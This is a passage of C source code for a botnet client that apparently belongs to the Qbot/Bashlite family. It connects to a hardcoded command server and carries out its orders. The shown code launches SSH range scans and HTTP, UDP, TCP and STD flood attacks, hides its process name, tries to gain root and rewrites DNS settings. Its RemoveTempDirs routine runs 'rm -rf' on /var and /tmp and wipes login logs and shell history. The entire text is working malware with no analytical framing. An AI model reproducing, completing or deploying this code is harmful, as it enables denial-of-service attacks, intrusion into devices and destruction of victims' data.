                sockprintf(mainCommSock, "[PYTHON] Range: 118.173.x.x || Port: 22");
            }
            if(!strcmp(argv[1], "4"))
            {
                char idefk[80];
                sprintf(idefk, "cd %s;python scan.py 376 B 91.99 2", Python_Temp_Directory);
                system(idefk);
                ClearHistory();
                sockprintf(mainCommSock, "[PYTHON] Range: 91.99.x.x || Port: 22");
            }
            if(!strcmp(argv[1], "5"))
            {
                char idefk[80];
                sprintf(idefk, "cd %s;python scan.py 376 B 92.99 2", Python_Temp_Directory);
                system(idefk);
                ClearHistory();
                sockprintf(mainCommSock, "[PYTHON] Range: 92.99.x.x || Port: 22");
            }
            if(!strcmp(argv[1], "LOAD"))
            {
                char idefk[80];
                sprintf(idefk, "cd %s;python scan.py 376 B %s 2", Python_Temp_Directory, RandomPythonRange);
                system(idefk);
                ClearHistory();
                sockprintf(mainCommSock, "[PYTHON] Range: Random || Port: 22");
            }
        }
        if (!strcmp(argv[0], "HTTP"))
        {
            // !* HTTP METHOD TARGET PORT PATH TIME POWER
            // !* HTTP POST/GET/HEAD hackforums.net 80 / 10 100
            if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
            if (listFork()) return;
            SendHTTP(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
            exit(0);
        }
        if(!strcmp(argv[0], "UDP"))
        {
            // !* UDP TARGET PORT TIME PACKETSIZE POLLINTERVAL
            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 1024 || (argc == 6 && atoi(argv[5]) < 1))
            {
                return;
            }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int packetsize = atoi(argv[4]);
                int pollinterval = (argc == 6 ? atoi(argv[5]) : 10);
                int spoofed = 32;
                if(strstr(ip, ",") != NULL)
                {
                    unsigned char *hi = strtok(ip, ",");
                    while(hi != NULL)
                    {
                        if(!listFork())
                        {
                            SendUDP(hi, port, time, packetsize, pollinterval, spoofed);
                            _exit(0);
                        }
                        hi = strtok(NULL, ",");
                    }
                } else {
                            if (listFork())
                            {
                                return;
                            }
                            SendUDP(ip, port, time, packetsize, pollinterval, spoofed);
                            _exit(0);
                       }   
        }
        if(!strcmp(argv[0], "TCP"))
        {
                //!* TCP TARGET PORT TIME FLAGS PACKETSIZE POLLINTERVAL
                if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || (argc > 5 && atoi(argv[5]) < 0) || (argc == 7 && atoi(argv[6]) < 1))
                {
                        return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                unsigned char *flags = argv[4];
                int pollinterval = argc == 7 ? atoi(argv[6]) : 10;
                int packetsize = argc > 5 ? atoi(argv[5]) : 0;
                int spoofed = 32;
                if(strstr(ip, ",") != NULL) {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL) {
                                if(!listFork()) {
                                        SendTCP(hi, port, time, flags, packetsize, pollinterval, spoofed);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else  {
                            if (listFork())
                            {
                                return;
                            }
                            SendTCP(ip, port, time, flags, packetsize, pollinterval, spoofed);
                            _exit(0);
                        }
        }
        if(!strcmp(argv[0], "STD"))
        {
            //!* STD TARGET PORT TIME
            if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
            {
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            if(strstr(ip, ",") != NULL)
            {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL)
                {
                    if(!listFork())
                    {
                        SendSTD(hi, port, time);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                        if (listFork())
                        {
                            return;
                        }
                        SendSTD(ip, port, time);
                        _exit(0);
                   }
        }
        if(!strcmp(argv[0], "KILLATTK"))
        {
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++)
                {
                        if (pids[i] != 0 && pids[i] != getpid())
                        {
                                kill(pids[i], 9);
                                killed++;
                        }
                }
                if(killed > 0)
                {
                    //
                } else {
                            //
                       }
        }
        if(!strcmp(argv[0], "LOLNOGTFO"))
        {
                exit(0);
        }
        if(!strcmp(argv[0], "UPDATE"))
        {
            RemoveTempDirs();
            sockprintf(mainCommSock, "[Updating] [%s:%s]", getBuild(), getEndianness());
        }
}
int initConnection() {
    unsigned char server[512];
    memset(server, 0, 512);
    if(mainCommSock) { close(mainCommSock); mainCommSock = 0; }
    if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
    else currentServer++;
    strcpy(server, commServer[currentServer]);
    int port = 6942;
    if(strchr(server, ':') != NULL) {
        port = atoi(strchr(server, ':') + 1);
        *((unsigned char *)(strchr(server, ':'))) = 0x0;
    }
    mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
    if(!connectTimeout(mainCommSock, server, port, 30)) return 1;
    return 0;
}
void UpdateNameSrvs() {
    uint16_t fhandler = open("/etc/resolv.conf", O_WRONLY | O_TRUNC);
    if (access("/etc/resolv.conf", F_OK) != -1) {
        const char* resd = "nameserver 8.8.8.8\nnameserver 8.8.4.4\n";
        size_t resl = strlen(resd);
        write(fhandler, resd, resl);
    } else { return; }
    close(fhandler);
}
void RemoveTempDirs() {
    system("rm -rf /tmp/* /var/* /var/run/* /var/tmp/*");
    system("rm -rf /var/log/wtmp");
    system("rm -rf ~/.bash_history");
    system("history -c;history -w");
}
int getEndianness(void)
{
    union
    {
        uint32_t vlu;
        uint8_t data[sizeof(uint32_t)];
    } nmb;
    nmb.data[0] = 0x00;
    nmb.data[1] = 0x01;
    nmb.data[2] = 0x02;
    nmb.data[3] = 0x03;
    switch (nmb.vlu)
    {
        case UINT32_C(0x00010203):
            return "BIG_ENDIAN";
        case UINT32_C(0x03020100):
            return "LITTLE_ENDIAN";
        case UINT32_C(0x02030001):
            return "BIG_ENDIAN_W";
        case UINT32_C(0x01000302):
            return "LITTLE_ENDIAN_W";
        default:
            return "UNKNOWN";
    }
}
int main(int argc, unsigned char *argv[]) {
        const char *lolsuckmekid = "";
        if(SERVER_LIST_SIZE <= 0) return 0;
        strncpy(argv[0],"",strlen(argv[0]));
        argv[0] = "";
        prctl(PR_SET_NAME, (unsigned long) lolsuckmekid, 0, 0, 0);
        srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        pid_t pid1;
        pid_t pid2;
        int status;
        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        exit(0);
                        } else if (!pid2) {
                        } else {
                        }
        } else {
        }
        chdir("/");
        setuid(0);             
        seteuid(0);
        signal(SIGPIPE, SIG_IGN);
        while(1) {
                if(fork() == 0) {
                if(initConnection()) { sleep(5); continue; }
                sockprintf(mainCommSock, "[ CONNECTED ] IP: %s || Arch Type: %s || Endianness Type: %s]", inet_ntoa(ourIP), getBuild(), getEndianness());
                UpdateNameSrvs();
                RemoveTempDirs();
                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(mainCommSock, commBuf, 4096)) != -1) {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }
                        commBuf[got] = 0x00;
                        trim(commBuf);
                        if(strstr(commBuf, "PING") == commBuf) { // PING
                                continue;
                        }
                        if(strstr(commBuf, "DUP") == commBuf) exit(0); // DUP
                        unsigned char *message = commBuf;
                        if(*message == '!') {
                                unsigned char *nickMask = message + 1;
                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = message + 1;
                                message = message + strlen(nickMask) + 2;
                                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;
                                unsigned char *command = message;
                                while(*message != ' ' && *message != 0x00) message++;
                                *message = 0x00;
                                message++;
                                unsigned char *tmpcommand = command;
                                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }
                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");
                                params[0] = command;
                                while(pch) {
                                        if(*pch != '\n') {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }
                                processCmd(paramsCount, params);
                                if(paramsCount > 1) {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++) {
                                                free(params[q]);
                                        }
                                }
                        }
                }
        }
        return 0;
    }
}
